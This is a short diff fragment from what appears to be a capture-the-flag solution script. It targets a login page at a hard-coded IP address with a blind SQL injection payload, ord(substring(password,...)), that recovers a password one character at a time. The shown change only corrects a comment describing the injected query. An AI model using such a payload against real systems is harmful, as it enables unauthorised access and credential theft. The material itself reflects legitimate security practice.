@@ -133,7 +133,7 @@ flag' and ord(substring(password,{index},1)) = {char} --
 import request
 
 url = "http://34.143.158.202:4111/index.php?page=login"
-#SELECT * from users WHERE username='flag' AND password = 'ord(substring(password,{index},1)) = {char} -- '
+#SELECT * from users WHERE username='flag' AND ord(substring(password,{index},1)) = {char} -- '
 
 def solve():
 	index = 1
